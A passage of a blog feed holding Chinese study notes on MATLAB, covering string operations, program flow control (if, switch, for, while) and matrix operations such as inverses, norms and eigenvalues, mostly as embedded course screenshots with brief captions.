<p>例题：<br><img src="https://img-blog.csdnimg.cn/20200225214246795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="G-b字符串的操作-strcmp-findstr-strrep"><a href="#G-b字符串的操作-strcmp-findstr-strrep" class="headerlink" title="G.b字符串的操作(strcmp;findstr;strrep)"></a>G.b字符串的操作(strcmp;findstr;strrep)</h2><p>将字符串内容作为MATLAB的命令执行<br><img src="https://img-blog.csdnimg.cn/2020022521453133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225214652808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225215346623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200225215325522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225215655578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<blockquote>
<p>图片来源（一个讲的不错的MATLAB课程）：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(03)Matlab程序流程控制（1）</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8803%EF%BC%89%E3%80%90matlab%E3%80%91Matlab%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(1)/</url>
    <content><![CDATA[<h1 id="A-顺序结构程序"><a href="#A-顺序结构程序" class="headerlink" title="A 顺序结构程序"></a>A 顺序结构程序</h1><blockquote>
<p>1、 程序和程序设计<br><img src="https://img-blog.csdnimg.cn/20200226095220984.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226095312497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<span id="more"></span>

<p>2、 程序的三种基本结构</p>
<ul>
<li>顺序结构</li>
<li>选择结构</li>
<li>循环结构</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>3、脚本文件和函数文件<br><img src="https://img-blog.csdnimg.cn/20200226095612628.png" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<p>4、文件的建立<br><img src="https://img-blog.csdnimg.cn/20200226095729894.png" alt="在这里插入图片描述"></p>
<ul>
<li>用<code>edit</code>命令创建文件<br><code>edit test </code>%创建test.m文件<br>例题：<br><img src="https://img-blog.csdnimg.cn/20200226095943502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>5、顺序结构<br><img src="https://img-blog.csdnimg.cn/20200226100056429.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226100326600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226100556715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>disp不会显示变量的名字和空格，输出格式更加紧凑。<br><img src="https://img-blog.csdnimg.cn/20200226100709134.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022610081793.png" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h1 id="B-用if语句实现选择结构"><a href="#B-用if语句实现选择结构" class="headerlink" title="B 用if语句实现选择结构"></a>B 用if语句实现选择结构</h1><blockquote>
<p>1、什么是选择结构<br><img src="https://img-blog.csdnimg.cn/20200226101516330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p>2、if语句<br><img src="https://img-blog.csdnimg.cn/2020022610162038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226102049629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200226102257272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226102518527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：‘’s‘:input()返回数据类型为字符<br><img src="https://img-blog.csdnimg.cn/20200226102651172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="C-用switch语句实现选择结构"><a href="#C-用switch语句实现选择结构" class="headerlink" title="C 用switch语句实现选择结构"></a>C 用switch语句实现选择结构</h1><blockquote>
<p>1、switch语句的格式<br><img src="https://img-blog.csdnimg.cn/20200226103350957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<ul>
<li>switch表达式应该是一个其值可以列举的表达式(如整形表达式，字符串表达式)。</li>
<li>case结果表为switch表达式的取值，当取值有多个时，用单元数据表示，也就是将多个结果用大括号括起来。</li>
</ul>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200226104010534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 例题：num2cell():将数值矩阵转化为单元矩阵<br><img src="https://img-blog.csdnimg.cn/2020022610455687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226104627440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="D-用for语句实现循环结构"><a href="#D-用for语句实现循环结构" class="headerlink" title="D 用for语句实现循环结构"></a>D 用for语句实现循环结构</h1><p><img src="https://img-blog.csdnimg.cn/20200226153749807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200226153923765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226154919708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p>for执行时是将矩阵的列向量赋给循环变量，行向量可以看成仅为一行的矩阵，每一列只有一个元素。<br><img src="https://img-blog.csdnimg.cn/20200226160325222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="E-用while语句实现循环结构"><a href="#E-用while语句实现循环结构" class="headerlink" title="E 用while语句实现循环结构"></a>E 用while语句实现循环结构</h1><p><img src="https://img-blog.csdnimg.cn/202002261607364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226160831594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/2020022616094222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200226161112147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200226161158917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(02)Matlab矩阵处理</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8802%EF%BC%89%E3%80%90Matlab%E3%80%91Matlab%E7%9F%A9%E9%98%B5%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="A-特殊矩阵"><a href="#A-特殊矩阵" class="headerlink" title="A 特殊矩阵"></a>A 特殊矩阵</h1><h2 id="A-a-通用性矩阵"><a href="#A-a-通用性矩阵" class="headerlink" title="A.a 通用性矩阵"></a>A.a 通用性矩阵</h2><p><img src="https://img-blog.csdnimg.cn/2020022522211851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以上函数调用格式相同，以zeros为例：<br><img src="https://img-blog.csdnimg.cn/20200225222235452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/2020022522311874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<span id="more"></span>

<h2 id="A-b-用于专门学科的特殊矩阵"><a href="#A-b-用于专门学科的特殊矩阵" class="headerlink" title="A.b 用于专门学科的特殊矩阵"></a>A.b 用于专门学科的特殊矩阵</h2><p><img src="https://img-blog.csdnimg.cn/20200225223516356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225223615715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225223730821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225223818877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225223910101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225223948678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>rat:有理数</p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225224117756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225224219403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225224445440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200225224515349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="B-矩阵变换"><a href="#B-矩阵变换" class="headerlink" title="B 矩阵变换"></a>B 矩阵变换</h1><h2 id="B-a-对角阵"><a href="#B-a-对角阵" class="headerlink" title="B.a 对角阵"></a>B.a 对角阵</h2><p><img src="https://img-blog.csdnimg.cn/20200225224850695.png" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225225014735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/2020022522511771.png" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225225320362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-b-三角阵"><a href="#B-b-三角阵" class="headerlink" title="B.b 三角阵"></a>B.b 三角阵</h2><p><img src="https://img-blog.csdnimg.cn/20200225225517654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225225548956.png" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-c-矩阵的转置"><a href="#B-c-矩阵的转置" class="headerlink" title="B.c 矩阵的转置"></a>B.c 矩阵的转置</h2><p><img src="https://img-blog.csdnimg.cn/20200225225648324.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200225225721400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-d-矩阵的旋转"><a href="#B-d-矩阵的旋转" class="headerlink" title="B.d 矩阵的旋转"></a>B.d 矩阵的旋转</h2><p><img src="https://img-blog.csdnimg.cn/20200225225828259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-e-矩阵的翻转"><a href="#B-e-矩阵的翻转" class="headerlink" title="B.e 矩阵的翻转"></a>B.e 矩阵的翻转</h2><p><img src="https://img-blog.csdnimg.cn/20200225225949126.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022523065439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="B-f-矩阵的求逆"><a href="#B-f-矩阵的求逆" class="headerlink" title="B.f 矩阵的求逆"></a>B.f 矩阵的求逆</h2><p><img src="https://img-blog.csdnimg.cn/20200225230905195.png" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225231016428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="C-矩阵求值"><a href="#C-矩阵求值" class="headerlink" title="C 矩阵求值"></a>C 矩阵求值</h1><h2 id="C-a-矩阵的行列式"><a href="#C-a-矩阵的行列式" class="headerlink" title="C.a 矩阵的行列式"></a>C.a 矩阵的行列式</h2><p><img src="https://img-blog.csdnimg.cn/20200225231300980.png" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225231438778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-b-矩阵的秩"><a href="#C-b-矩阵的秩" class="headerlink" title="C.b 矩阵的秩"></a>C.b 矩阵的秩</h2><p><img src="https://img-blog.csdnimg.cn/2020022523151992.png" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225231738565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="C-c-矩阵的迹"><a href="#C-c-矩阵的迹" class="headerlink" title="C.c 矩阵的迹"></a>C.c 矩阵的迹</h2><p><img src="https://img-blog.csdnimg.cn/20200225231809926.png" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200225231839886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-d-向量和矩阵的范数"><a href="#C-d-向量和矩阵的范数" class="headerlink" title="C.d 向量和矩阵的范数"></a>C.d 向量和矩阵的范数</h2><p>矩阵或向量的范数用来度量矩阵或向量在某种意义下的长度。<br><img src="https://img-blog.csdnimg.cn/20200225232020998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225232059755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225232210345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225232314833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-e-矩阵的条件数"><a href="#C-e-矩阵的条件数" class="headerlink" title="C.e 矩阵的条件数"></a>C.e 矩阵的条件数</h2><p><img src="https://img-blog.csdnimg.cn/20200225232406378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225232453185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225232536340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="D-矩阵的特征值与特征向量"><a href="#D-矩阵的特征值与特征向量" class="headerlink" title="D 矩阵的特征值与特征向量"></a>D 矩阵的特征值与特征向量</h1><h2 id="D-a-矩阵特征值的数学定义"><a href="#D-a-矩阵特征值的数学定义" class="headerlink" title="D.a 矩阵特征值的数学定义"></a>D.a 矩阵特征值的数学定义</h2><p><img src="https://img-blog.csdnimg.cn/20200226010535257.png" alt="在这里插入图片描述"></p>
<hr>
<h2 id="D-b-求矩阵的特征值和特征向量"><a href="#D-b-求矩阵的特征值和特征向量" class="headerlink" title="D.b 求矩阵的特征值和特征向量"></a>D.b 求矩阵的特征值和特征向量</h2><p><img src="https://img-blog.csdnimg.cn/20200226010633561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：A*X(:,1)&#x3D;D(1)*X(:,1)<br><img src="https://img-blog.csdnimg.cn/20200226010826919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200226011313434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>X3对角为X1和X2，</p>
<hr>
<h2 id="D-c-特征值的几何意义"><a href="#D-c-特征值的几何意义" class="headerlink" title="D.c 特征值的几何意义"></a>D.c 特征值的几何意义</h2><p><img src="https://img-blog.csdnimg.cn/20200226012010606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>y1和y2分别是x1和x2经过A矩阵变换得到的。把$\lambda_1、\lambda_2$当作伸缩因子，y1和y2是x1和x2经过$\lambda_1、\lambda_2$伸缩以后的结果，如图所示。<br>更进一步地，连续取单位向量x，让它大小保持唯一，那么Ax就将圆弧拉伸，变成椭圆弧。<br><img src="https://img-blog.csdnimg.cn/20200226012651958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img 